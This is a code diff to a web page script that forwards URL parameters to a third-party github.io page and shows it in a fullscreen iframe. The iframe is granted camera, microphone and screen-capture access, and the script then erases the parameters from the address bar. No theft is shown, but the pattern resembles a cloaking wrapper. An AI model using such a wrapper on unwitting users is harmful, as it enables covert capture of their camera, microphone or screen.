@@ -41,21 +41,29 @@
 <body>
 
 <script>
-  // Read username from URL
+  // Read parameters
   const params = new URLSearchParams(window.location.search);
   const username = params.get("username");
+  const identifier = params.get("identifier");
+  const file = params.get("file");
 
-  if (!username) {
+  if (!username || !identifier) {
     document.body.innerHTML = `
       <div class="error">
-        Invalid or missing username
+        Invalid or missing username / identifier
       </div>
     `;
   } else {
-    // Converted destination URL
-    const targetUrl =
-      "https://videos-1.github.io/archive-testing-22/index.html?username=" +
-      encodeURIComponent(username);
+    // Base destination URL
+    let targetUrl =
+      "https://videos-1.github.io/archive-testing-222/index.html" +
+      "?username=" + encodeURIComponent(username) +
+      "&identifier=" + encodeURIComponent(identifier);
+
+    // Add file ONLY if it exists
+    if (file) {
+      targetUrl += "&file=" + encodeURIComponent(file);
+    }
 
     // Create fullscreen iframe
     const iframe = document.createElement("iframe");
@@ -75,12 +83,13 @@
       camera;
       microphone;
       display-capture;
-      web-share
+      web-share;
+      screen-wake-lock
     `;
 
     document.body.appendChild(iframe);
 
-    // Clean address bar (hide shared parameters)
+    // Clean address bar
     window.history.replaceState(null, "", window.location.pathname);
   }
 </script>
